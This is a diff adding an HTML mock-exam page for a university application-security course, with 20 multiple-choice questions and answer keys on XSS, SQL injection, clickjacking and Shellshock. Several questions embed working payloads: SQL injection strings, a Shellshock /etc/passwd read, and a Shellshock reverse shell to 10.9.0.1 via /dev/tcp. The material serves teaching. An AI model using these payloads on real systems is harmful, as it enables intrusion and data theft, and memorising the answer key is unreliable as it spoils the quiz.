@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Part 1 Mock Exam · CSC351</title>
+  <link rel="stylesheet" href="shared/style.css">
+  <script src="shared/menu.js" defer></script>
+  <style>
+    .welcome-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-md);
+      padding: 40px 48px;
+      max-width: 680px;
+      margin: 40px auto 80px;
+      box-shadow: var(--shadow-subtle);
+    }
+    .welcome-title {
+      font-family: 'DM Serif Display', serif;
+      font-size: 32px;
+      color: var(--text-primary);
+      margin-bottom: 12px;
+      text-align: center;
+    }
+    .welcome-subtitle {
+      font-size: 14px;
+      color: var(--text-secondary);
+      line-height: 1.6;
+      text-align: center;
+      margin-bottom: 32px;
+    }
+    .features-list {
+      list-style: none;
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+      margin-bottom: 36px;
+    }
+    .features-list li {
+      font-size: 14px;
+      color: var(--text-secondary);
+      line-height: 1.6;
+      padding-left: 28px;
+      position: relative;
+    }
+    .features-list li::before {
+      content: '✓';
+      position: absolute;
+      left: 0;
+      color: var(--success);
+      font-weight: 700;
+      font-size: 16px;
+    }
+    .features-list strong {
+      color: var(--text-primary);
+      font-weight: 600;
+    }
+    .topic-pills {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+      justify-content: center;
+      margin: 20px 0 32px;
+    }
+    .topic-pill {
+      font-size: 11px;
+      font-weight: 600;
+      letter-spacing: 0.05em;
+      text-transform: uppercase;
+      background: var(--surface);
+      color: var(--text-secondary);
+      border: 1px solid var(--border);
+      padding: 6px 12px;
+      border-radius: 20px;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Sidebar Drawer Navigation -->
+  <div class="drawer-backdrop" id="menu-backdrop"></div>
+  <div class="drawer" id="menu-drawer">
+    <button class="drawer-close" id="menu-close" aria-label="Close menu">✕</button>
+    <a class="drawer-logo" href="index.html">Ant</a>
+    <nav class="drawer-menu">
+      <a class="drawer-menu-item" href="index.html">Home Dashboard</a>
+      
+      <div style="height: 1px; background: var(--border); margin: 8px 0;"></div>
+      
+      <a class="drawer-menu-item" href="xss.html">
+        <span style="font-size: 10px; color: var(--accent); font-weight: 700; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 2px;">Lecture 11</span>
+        XSS — Cross-Site Scripting
+      </a>
+      
+      <a class="drawer-menu-item" href="sqli.html">
+        <span style="font-size: 10px; color: var(--accent); font-weight: 700; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 2px;">Lecture 12</span>
+        SQL Injection
+      </a>
+      
+      <a class="drawer-menu-item" href="clickjacking.html">
+        <span style="font-size: 10px; color: var(--accent); font-weight: 700; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 2px;">Lecture 13</span>
+        Clickjacking
+      </a>
+      
+      <div class="drawer-menu-item">
+        <span style="font-size: 10px; color: var(--accent); font-weight: 700; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 2px;">Lecture 14 &amp; 15</span>
+        <a href="shellshock.html" style="text-decoration: none; color: inherit; font-weight: 600;">Shellshock Hub</a>
+        <div class="drawer-sub-menu">
+          <a class="drawer-sub-item" href="shellshock-part1.html">Part 1: Concept &amp; Vulnerability</a>
+          <a class="drawer-sub-item" href="shellshock-part2.html">Part 2: Notes &amp; Quiz</a>
+        </div>
+      </div>
+      
+      <div style="height: 1px; background: var(--border); margin: 8px 0;"></div>
+      
+      <a class="drawer-menu-item" href="mock-exam.html" style="color: var(--accent);">
+        <span style="font-size: 10px; color: var(--accent); font-weight: 700; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 2px;">Part 1 · Exam Practice</span>
+        Mock Exam (20 MCQs)
+        <span style="align-self: flex-start; background: var(--accent); color: #fff; font-size: 9px; padding: 1px 6px; border-radius: 4px; font-weight: 600; margin-top: 4px;">Active</span>
+      </a>
+
+      <a class="drawer-menu-item" href="exam-questions.html">
+        <span style="font-size: 10px; color: var(--accent); font-weight: 700; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 2px;">Part 2 · Exam Prep</span>
+        Possible exam questions
+      </a>
+      <a class="drawer-menu-item" href="exam-xss.html" style="padding-left: 20px;">
+        ↳ XSS — Practice Questions
+      </a>
+      <a class="drawer-menu-item" href="exam-sqli.html" style="padding-left: 20px;">
+        ↳ SQLi — Practice Questions
+      </a>
+      <a class="drawer-menu-item" href="exam-clickjacking.html" style="padding-left: 20px;">
+        ↳ Clickjacking — Practice Questions
+      </a>
+      <a class="drawer-menu-item" href="exam-shellshock.html" style="padding-left: 20px;">
+        ↳ Shellshock — Practice Questions
+      </a>
+    </nav>
+  </div>
+
+  <!-- Nav -->
+  <nav class="nav">
+    <div class="nav-inner">
+      <button class="nav-menu-toggle" id="menu-toggle" aria-label="Open menu">☰</button>
+      <div class="nav-menu-left" style="margin-left: 48px;">
+        <a href="index.html">Topics</a>
+      </div>
+      <a class="nav-brand" href="index.html">Ant</a>
+      <div class="nav-menu-right">
+        <a href="exam-questions.html" style="color: var(--accent); text-decoration: none; font-size: 11px; font-weight: 700; letter-spacing: 0.08em; text-transform: uppercase; display: inline-flex; align-items: center; gap: 6px;">
+          Part 2 — Exam Prep
+          <span style="background: var(--accent); color: #fff; font-size: 9px; padding: 2px 6px; border-radius: 4px; font-weight: 600;">Active</span>
+        </a>
+      </div>
+      <a class="nav-back" href="index.html">← Dashboard</a>
+    </div>
+  </nav>
+
+  <!-- Mode indicator -->
+  <div class="mode-bar">
+    <div class="mode-bar-inner">
+      <span class="mode-step active" id="mode-1">Introduction</span>
+      <span class="mode-chevron">›</span>
+      <span class="mode-step" id="mode-2">Mock Exam</span>
+      <span class="mode-chevron">›</span>
+      <span class="mode-step" id="mode-3">Results &amp; Review</span>
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════════════════════════ -->
+  <!-- SCREEN: WELCOME / INTRODUCTION                        -->
+  <!-- ══════════════════════════════════════════════════════ -->
+  <div id="screen-notes" class="screen">
+    <div class="content">
+      <div class="welcome-card">
+        <h1 class="welcome-title">Part 1 Mock Exam</h1>
+        <p class="welcome-subtitle">Block 3 Application Security Lectures Exam Simulator</p>
+        
+        <div class="topic-pills">
+          <span class="topic-pill">Lecture 11: XSS</span>
+          <span class="topic-pill">Lecture 12: SQLi</span>
+          <span class="topic-pill">Lecture 13: Clickjacking</span>
+          <span class="topic-pill">Lecture 14 &amp; 15: Shellshock</span>
+        </div>
+
+        <ul class="features-list">
+          <li>
+            <strong>20 Mixed Multiple-Choice Questions:</strong> 
+            Exactly 5 randomly selected high-yield questions from each of the 4 block topics to simulate a balanced exam structure.
+          </li>
+          <li>
+            <strong>AI-Powered Diagnostic Feedback:</strong> 
+            After completion, the AI tutor (Claude) will analyze all of your incorrect selections, diagnose weaknesses, and provide a tailored study list.
+          </li>
+          <li>
+            <strong>Knowledge Score Breakdown:</strong> 
+            Your score will be saved locally so you can easily track your prep progress from the home dashboard.
+          </li>
+          <li>
+            <strong>Exam Mode Environment:</strong> 
+            Try answering all questions without referencing your notes to accurately check your retention.
+          </li>
+        </ul>
+
+        <button class="btn btn-primary" onclick="goToQuiz(window._quiz)" style="display: block; margin: 40px auto 0; font-size: 16px; padding: 14px 40px; width: 100%; border-radius: var(--radius-sm);">
+          Start Mock Exam →
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════════════════════════ -->
+  <!-- SCREEN: QUIZ                                           -->
+  <!-- ══════════════════════════════════════════════════════ -->
+  <div id="screen-quiz" class="screen fading hidden">
+    <!-- Quiz topbar -->
+    <div class="quiz-topbar">
+      <span class="quiz-topbar-left" id="quiz-progress-text">0 / 20 answered</span>
+      <div class="quiz-topbar-center">
+        <div class="quiz-progress-track">
+          <div class="quiz-progress-fill" id="quiz-progress-fill"></div>
+        </div>
+      </div>
+      <div class="quiz-topbar-right">
+        <button class="btn btn-primary" id="quiz-submit-btn" style="padding:7px 16px;font-size:13px;" disabled>Submit answers</button>
+      </div>
+    </div>
+
+    <!-- Questions -->
+    <div class="quiz-content">
+      <div id="quiz-container"></div>
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════════════════════════ -->
+  <!-- SCREEN: RESULTS                                        -->
+  <!-- ══════════════════════════════════════════════════════ -->
+  <div id="screen-results" class="screen fading hidden">
+    <div class="results-content">
+      
+      <div class="results-summary">
+        <h2 style="font-family: 'DM Serif Display', serif; font-size: 32px; margin-bottom: 8px;">Exam Complete</h2>
+        <p style="font-size: 14px; color: var(--text-secondary); margin-bottom: 24px;">Here is your diagnostic breakdown. Review graded questions below.</p>
+        
+        <div class="score-display">
+          <div>
+            <span class="score-big" id="score-fraction">0/20</span>
+          </div>
+          <div class="score-pct" id="score-text">0%</div>
+          <div class="score-grade" id="score-grade"></div>
+        </div>
+      </div>
+
+      <!-- AI Tutor Feedback Box -->
+      <div class="feedback-box">
+        <h3 style="font-family: 'DM Serif Display', serif; font-size: 18px; margin-bottom: 16px;">AI Tutor Evaluation</h3>
+        
+        <!-- Loading spinner -->
+        <div class="feedback-loading" id="feedback-loading">
+          <div class="spinner"></div>
+          <div style="margin-top: 12px; font-size: 13px; color: var(--text-secondary);">Claude is analyzing your wrong answers...</div>
+        </div>
+
+        <div class="feedback-content" id="feedback-content" style="white-space: pre-wrap; font-size: 14px; line-height: 1.6; color: var(--text-primary);">
+          <!-- Inserted dynamically -->
+        </div>
+      </div>
+
+      <div class="results-actions">
+        <button class="btn btn-primary" onclick="window._quiz.reviewAnswers()" style="padding: 12px 28px;">👁 Review graded answers</button>
+        <button class="btn btn-secondary" onclick="window._quiz.retry()" style="padding: 12px 24px;">↺ Retry exam</button>
+        <button class="btn btn-secondary" onclick="window._quiz.reset()" style="padding: 12px 24px;">← Back to introduction</button>
+      </div>
+    </div>
+  </div>
+
+  <script src="shared/quiz.js"></script>
+  <script>
+    const questions = [
+      // --- XSS & Clickjacking ---
+      {
+        q: "An attacker creates a transparent iframe of bank.com over a prize button on attacker.com (victim is logged in and clicks). Separately, an attacker stores a malicious script in a forum post that steals cookies from every visitor. Which attacks are these, respectively?",
+        code: null,
+        opts: [
+          "CSRF then Stored XSS",
+          "Clickjacking then Reflected XSS",
+          "Clickjacking then Stored XSS",
+          "Reflected XSS then Clickjacking"
+        ],
+        answer: 2,
+        source: "Lecture 11 — XSS & Lecture 13 — Clickjacking"
+      },
+      // --- SQL Injection ---
+      {
+        q: "A login form uses this query. An attacker enters admin' -- into the username field and leaves the password blank. What happens?",
+        code: "SELECT * FROM users WHERE username='$input' AND password='$pwd'",
+        opts: [
+          "Database returns an error because -- is invalid syntax",
+          "Login fails because admin' is not a valid username",
+          "The -- comments out the password check so only WHERE username='admin' is evaluated and login succeeds",
+          "The password field is set to null and all users are returned"
+        ],
+        answer: 2,
+        source: "Lecture 12 — SQL Injection"
+      },
+      // --- Shellshock ---
+      {
+        q: "What does this command test and what output means the system is vulnerable?",
+        code: "env x='() { :; }; echo vulnerable' bash -c 'echo test'",
+        opts: [
+          "Tests network connectivity, vulnerable if timeout",
+          "Tests if Bash executes commands after a function definition in an env var, vulnerable if 'vulnerable' prints before 'test'",
+          "Tests file permissions, vulnerable if 'test' prints twice",
+          "Tests env var creation, vulnerable if no output"
+        ],
+        answer: 1,
+        source: "Lecture 14 & 15 — Shellshock"
+      },
+      // --- Clickjacking ---
+      {
+        q: "A developer uses a JavaScript frame buster (checks window.top === window.self). An attacker loads the page in an iframe with sandbox='allow-forms'. What happens?",
+        code: null,
+        opts: [
+          "Frame buster detects the iframe and redirects",
+          "Sandbox encrypts iframe content",
+          "Sandbox disables JavaScript inside the iframe so the frame buster never executes and the page stays trapped",
+          "Sandbox blocks cookies preventing the attack"
+        ],
+        answer: 2,
+        source: "Lecture 13 — Clickjacking"
+      },
+      // --- XSS ---
+      {
+        q: "A website sets HttpOnly on its session cookie. An attacker successfully injects stored XSS. Which of the following can the script still do?",
+        code: null,
+        opts: [
+          "Read the session cookie via document.cookie",
+          "Nothing at all, HttpOnly prevents all XSS damage",
+          "Modify the page DOM, send requests via fetch() on behalf of the user, and read personal data displayed on the page",
+          "Bypass SOP and read cookies from other domains"
+        ],
+        answer: 2,
+        source: "Lecture 11 — XSS"
+      },
+      // --- SQL Injection ---
+      {
+        q: "According to the Alice and Bob textbook, which is the ONLY reliable defense against SQL Injection?",
+        code: null,
+        opts: [
+          "Input validation with a blocklist",
+          "Web Application Firewall filtering SQL keywords",
+          "Parameterized queries, sending query structure and data separately",
+          "Output encoding before displaying results"
+        ],
+        answer: 2,
+        source: "Lecture 12 — SQL Injection"
+      },
+      // --- Shellshock ---
+      {
+        q: "What is the specific role of CGI in making Shellshock remotely exploitable?",
+        code: null,
+        opts: [
+          "CGI stores the payload in a database",
+          "CGI encrypts HTTP headers before passing to Bash",
+          "When Apache runs a CGI script it creates a child Bash process and passes HTTP headers as environment variables, delivering the payload to Bash",
+          "CGI is a browser plugin that executes shell commands"
+        ],
+        answer: 2,
+        source: "Lecture 14 & 15 — Shellshock"
+      },
+      // --- Clickjacking ---
+      {
+        q: "A banking site has CSRF tokens on all forms. A tester successfully performs Clickjacking. Why did the CSRF token not prevent it?",
+        code: null,
+        opts: [
+          "Token expired before the click",
+          "Attacker stole token via XSS first",
+          "The real bank page loads in the iframe in a legitimate session with a valid token. Nothing is forged so CSRF protection has nothing to catch.",
+          "CSRF tokens only work on POST, attack used GET"
+        ],
+        answer: 2,
+        source: "Lecture 13 — Clickjacking"
+      },
+      // --- XSS ---
+      {
+        q: "An attacker sends a victim a link containing a script tag in the URL parameter. The search page echoes the input back without encoding. The script executes. What type of XSS is this?",
+        code: null,
+        opts: [
+          "Stored XSS",
+          "Reflected XSS, the page has reflective behavior echoing input without output encoding",
+          "DOM-based XSS",
+          "CSRF"
+        ],
+        answer: 1,
+        source: "Lecture 11 — XSS"
+      },
+      // --- SQL Injection ---
+      {
+        q: "An attacker injects ' OR 1=1# into a login username field. What is this technique called and what does the database return?",
+        code: null,
+        opts: [
+          "Comment injection, returns admin account only",
+          "Tautology attack, 1=1 is always true so every row passes the WHERE condition and the entire table is returned",
+          "Union injection, merges two SELECT statements",
+          "Blind injection, infers data from response time"
+        ],
+        answer: 1,
+        source: "Lecture 12 — SQL Injection"
+      },
+      // --- Shellshock ---
+      {
+        q: "A tester sets up a reverse shell via Shellshock. Why does the connection go FROM the server TO the attacker rather than the other way?",
+        code: "nc -lv 9090  (attacker machine)\ncurl -A \"() { :; }; /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\" http://target/cgi-bin/vul.cgi",
+        opts: [
+          "Attacker has faster connection",
+          "Firewalls block inbound connections to servers but usually allow outbound. The payload forces the server to initiate an outbound connection to the attacker.",
+          "HTTP protocol requires server to respond first",
+          "Bash can only create outbound connections"
+        ],
+        answer: 1,
+        source: "Lecture 14 & 15 — Shellshock"
+      },
+      // --- Clickjacking ---
+      {
+        q: "Which is the CURRENT recommended defense against Clickjacking according to OWASP and Alice and Bob textbook?",
+        code: null,
+        opts: [
+          "X-Frame-Options: DENY",
+          "X-Content-Type-Options: nosniff",
+          "Content-Security-Policy: frame-ancestors 'none' or 'self'",
+          "Strict-Transport-Security: max-age=31536000"
+        ],
+        answer: 2,
+        source: "Lecture 13 — Clickjacking"
+      },
+      // --- XSS ---
+      {
+        q: "What is the fundamental difference between XSS and CSRF that Ajan explicitly deducts points for confusing?",
+        code: null,
+        opts: [
+          "XSS targets the database, CSRF targets the browser",
+          "XSS runs the attacker's own code in the victim's browser. CSRF tricks the browser into sending a forged request using the victim's own session, no attacker code runs.",
+          "XSS requires login, CSRF does not",
+          "XSS only works on GET, CSRF only on POST"
+        ],
+        answer: 1,
+        source: "Lecture 11 — XSS"
+      },
+      // --- SQL Injection ---
+      {
+        q: "A tester injects the payload below. The page shows no error but Alice's salary silently changes. Why is this dangerous?",
+        code: "Alice'; UPDATE credential SET salary=999999 WHERE name='Alice';#",
+        opts: [
+          "It crashes the database causing visible downtime",
+          "The semicolons start a new statement that silently modifies data. The original query runs normally so there is no error, no crash, and no visible sign.",
+          "It encrypts the salary field",
+          "It creates a new admin account"
+        ],
+        answer: 1,
+        source: "Lecture 12 — SQL Injection"
+      },
+      // --- Shellshock ---
+      {
+        q: "In the Shellshock payload below, why are the echo Content-Type and blank echo lines required before the actual command?",
+        code: "() { :; }; echo Content-Type: text/plain; echo; /bin/cat /etc/passwd",
+        opts: [
+          "They are part of the trigger syntax for Bash function recognition",
+          "CGI output must start with Content-Type header then blank line. Without this, Apache discards the output and the attacker never sees the result.",
+          "They encrypt the output to bypass firewalls",
+          "They elevate command privileges to root"
+        ],
+        answer: 1,
+        source: "Lecture 14 & 15 — Shellshock"
+      },
+      // --- Clickjacking ---
+      {
+        q: "Two iframes overlap. Neither has z-index. iframe A is declared first, iframe B declared second with opacity:0. Which receives the click?",
+        code: null,
+        opts: [
+          "iframe A, first declared always receives clicks",
+          "iframe B, when no z-index is set the last declared element sits on top",
+          "Neither, browser blocks clicks on overlapping iframes",
+          "Both receive the click simultaneously"
+        ],
+        answer: 1,
+        source: "Lecture 13 — Clickjacking"
+      },
+      // --- XSS ---
+      {
+        q: "A developer validates input before saving but does NOT do output encoding. Which attack still succeeds?",
+        code: null,
+        opts: [
+          "SQL Injection",
+          "Reflected XSS, the payload arrives in the URL and is echoed back without being saved so input validation on storage is irrelevant",
+          "CSRF",
+          "Clickjacking"
+        ],
+        answer: 1,
+        source: "Lecture 11 — XSS"
+      },
+      // --- Shellshock ---
+      {
+        q: "Shellshock (CVE-2014-6271) is classified as which vulnerability type, and which two conditions must BOTH be true for remote web exploitation?",
+        code: null,
+        opts: [
+          "Denial of Service, requires unpatched Bash and SSH",
+          "Remote Code Execution (RCE), requires unpatched vulnerable Bash AND a CGI script on the web server",
+          "Privilege Escalation, requires root access and a cron job",
+          "Information Disclosure, requires unpatched Bash and FTP"
+        ],
+        answer: 1,
+        source: "Lecture 14 & 15 — Shellshock"
+      },
+      // --- SQL Injection ---
+      {
+        q: "A web app database account has read-only permissions. Attacker performs SQL injection with ' OR 1=1#. What can they do and what principle limits the damage?",
+        code: null,
+        opts: [
+          "Attacker can read all data but CANNOT execute UPDATE, DELETE, or DROP. This is Least Privilege limiting the blast radius.",
+          "Attacker can do nothing, read-only prevents all injection",
+          "Attacker can still modify data because injection bypasses permissions",
+          "Attacker can escalate to write permissions via second injection"
+        ],
+        answer: 0,
+        source: "Lecture 12 — SQL Injection"
+      },
+      // --- Clickjacking ---
+      {
+        q: "Ajan demonstrated SOP inside iframes: parent on attacker32.com has child iframes A and B from attacker32.com and C from bank32.com. Parent tries to read each child's DOM. What happens?",
+        code: null,
+        opts: [
+          "Parent reads A, B, and C because iframes bypass SOP",
+          "Parent reads A and B (same origin) but access to C is denied by SOP because bank32.com is a different origin",
+          "Parent cannot read any child iframe",
+          "Parent can only read C because bank32.com has higher privileges"
+        ],
+        answer: 1,
+        source: "Lecture 13 — Clickjacking"
+      }
+    ];
+
+    const mockFeedbackPrompt = (score, wrongText) =>
+      `You are a CSC351 Application Security tutor at KMUTT helping a student review their 20-question mixed Mock Exam (Part 1 Lectures) results before their Block 3 exam.\n\nScore: ${score}/20\nWrong answers:\n${wrongText}\n\nWrite concise exam-focused feedback in plain text only. For each wrong answer write Q[number]: then one sentence explaining why the correct answer is right and why their choice was wrong. Highlight which topic (XSS, SQLi, Clickjacking, or Shellshock) that question belongs to. Then write "Review focus:" naming the specific topics they need to review again based on their performance. End with one short encouraging sentence. No markdown, no bullet symbols, no headers.`;
+
+    const quiz = new Quiz('quiz-container', questions, 'score_mock', mockFeedbackPrompt);
+    window._quiz = quiz;
+    quiz.build();
+  </script>
+
+  <!-- Footer -->
+  <footer class="footer">
+    <div class="footer-inner">
+      <a class="footer-logo" href="index.html">
+        <span class="footer-logo-text">Ant</span>
+        <span class="footer-logo-sub">AppSec Hub</span>
+      </a>
+      <div class="footer-meta">
+        © 2026 Ant. Built for CSC351 Application Security, SIT Faculty, KMUTT.
+      </div>
+    </div>
+  </footer>
+
+</body>
+</html>
